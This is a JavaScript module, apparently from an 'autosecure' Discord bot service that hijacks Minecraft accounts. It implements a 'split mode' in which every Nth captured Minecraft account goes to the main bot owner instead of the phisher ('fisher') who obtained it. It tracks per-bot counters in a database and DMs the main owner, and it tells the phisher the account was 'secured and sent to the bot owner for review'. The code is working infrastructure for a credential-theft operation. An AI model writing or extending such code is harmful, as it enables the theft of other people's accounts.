const { queryParams } = require("../../../db/database");

/**
 * Check if split mode should trigger for this account
 * @param {string} ownerId - The bot owner's user ID (from client.username)
 * @param {number} botNumber - The bot number (from client.botnumber)
 * @param {object} acc - The secured account object
 * @returns {Promise<{shouldSplit: boolean, ownerId: string|null, ratio: number}>}
 */
async function checkSplitMode(ownerId, botNumber, acc) {
    try {
        // Only applies to accounts with Minecraft Java
        const checkmc = require("../../../db/checkmc");
        const hasMinecraft = await checkmc(acc.mc);
        
        if (!hasMinecraft) {
            console.log(`[SPLIT MODE] Skipping non-Minecraft account (not counting toward split ratio)`);
            return { shouldSplit: false, ownerId: null, ratio: 0 };
        }

        // Check if split mode is enabled for this owner's bot in autosecure table
        const botSettings = await queryParams('SELECT split_mode_enabled, split_mode_ratio FROM autosecure WHERE user_id = ? AND botnumber = ?', [ownerId, botNumber]);
        
        if (!botSettings || botSettings.length === 0 || botSettings[0].split_mode_enabled !== 1) {
            return { shouldSplit: false, ownerId: null, ratio: 0 };
        }

        const ratio = botSettings[0].split_mode_ratio || 2;

        // Get bot counter
        const botData = await queryParams('SELECT split_counter FROM users WHERE user_id = ? AND botnumber = ?', [ownerId, botNumber]);
        const currentCounter = (botData && botData.length > 0) ? (botData[0].split_counter || 0) : 0;

        // Increment counter
        const newCounter = currentCounter + 1;
        
        // Check if this is the Nth account
        const shouldSplit = newCounter >= ratio;

        // If reached the split, send notification to the main bot owner
        if (shouldSplit) {
            try {
                // Send notification to main bot owner
                try {
                    const config = require('../../../config.json');
                    const mainOwnerId = config.owners && config.owners.length > 0 ? config.owners[0] : null;
                    
                    if (mainOwnerId && mainOwnerId !== ownerId) { // Don't send to self if bot owner is also main owner
                        const controllerBot = require('../../../mainbot/controllerbot.js');
                        const mainClient = controllerBot.client;
                        if (mainClient && mainClient.user) {
                            const mainOwner = await mainClient.users.fetch(mainOwnerId).catch(() => null);
                            if (mainOwner) {
                                const pingMsg = {
                                    content: `🔔 <@${mainOwnerId}> Split mode: Bot owner <@${ownerId}> reached ${ratio} Minecraft accounts!`,
                                };
                                await mainOwner.send(pingMsg);
                            }
                        }
                    }
                } catch (e) {
                    console.error('[SPLIT MODE] Could not send split notification to main owner:', e.message);
                }
            } catch (e) {
                console.error('[SPLIT MODE] Error preparing split notification:', e.message);
            }
        }

        // Update counter (reset to 0 if we're splitting, otherwise keep counting)
        const resetCounter = shouldSplit ? 0 : newCounter;
        
        // Ensure split_counter column exists and update/insert counter
        try {
            // First ensure the column exists
            try {
                await queryParams('ALTER TABLE users ADD COLUMN split_counter INTEGER DEFAULT 0');
            } catch (e) {
                // Column already exists, ignore
            }
            
            // Check if row exists
            const existingRow = await queryParams('SELECT user_id FROM users WHERE user_id = ? AND botnumber = ?', [ownerId, botNumber]);
            
            if (existingRow && existingRow.length > 0) {
                // Row exists, update it
                await queryParams('UPDATE users SET split_counter = ? WHERE user_id = ? AND botnumber = ?', [resetCounter, ownerId, botNumber]);
                console.log(`[SPLIT MODE] Updated counter to ${resetCounter} for ${ownerId} bot #${botNumber}`);
            } else {
                // Row doesn't exist, insert it
                await queryParams(
                    'INSERT INTO users (user_id, botnumber, split_counter) VALUES (?, ?, ?)',
                    [ownerId, botNumber, resetCounter]
                );
                console.log(`[SPLIT MODE] Created new row with counter ${resetCounter} for ${ownerId} bot #${botNumber}`);
            }
        } catch (err) {
            console.error('[SPLIT MODE] Error updating counter:', err);
        }

        console.log(`[SPLIT MODE] Owner: ${ownerId}, Bot: #${botNumber}, Counter: ${newCounter}/${ratio}, Split: ${shouldSplit}`);

        // Get main owner from config
        const config = require('../../../config.json');
        const mainOwner = config.owners && config.owners.length > 0 ? config.owners[0] : ownerId;

        return { shouldSplit, ownerId: mainOwner, ratio };

    } catch (error) {
        console.error('[SPLIT MODE] Error checking split mode:', error);
        return { shouldSplit: false, ownerId: null, ratio: 0 };
    }
}

/**
 * Send account to bot owner instead of fisher
 * @param {string} ownerId - Bot owner's user ID
 * @param {object} msg - The account message object
 * @param {object} acc - The secured account
 * @param {string} uid - Account UID
 * @returns {Promise<boolean>}
 */
async function sendToOwner(ownerId, msg, acc, uid) {
    try {
        // Get the main bot client from the controller
        let mainClient;
        try {
            const controllerBot = require('../../../mainbot/controllerbot.js');
            mainClient = controllerBot.client;
        } catch (e) {
            console.error(`[SPLIT MODE] Could not load main bot client:`, e.message);
            return false;
        }
        
        if (!mainClient || !mainClient.user) {
            console.error(`[SPLIT MODE] Main bot client not ready or not available`);
            return false;
        }

        const owner = await mainClient.users.fetch(ownerId).catch(() => null);
        
        if (!owner) {
            console.error(`[SPLIT MODE] Could not fetch owner: ${ownerId}`);
            return false;
        }

        // Deprecated: no longer sending to DM, handled in channel
        return true;

    } catch (error) {
        console.error('[SPLIT MODE] Error sending to owner:', error);
        return false;
    }
}

/**
 * Create a message for the fisher when their account was sent to the owner
 * @param {string} username - Minecraft username
 * @returns {object}
 */
function createOwnerRedirectMessage(username) {
    return {
        embeds: [{
            title: "Account Secured",
            description: `The account **${username}** has been secured and sent to the bot owner for review.`,
            color: 0x5f9ea0,
            footer: { text: "Thank you for using our service!" },
            timestamp: new Date()
        }]
    };
}

module.exports = {
    checkSplitMode,
    sendToOwner,
    createOwnerRedirectMessage
};
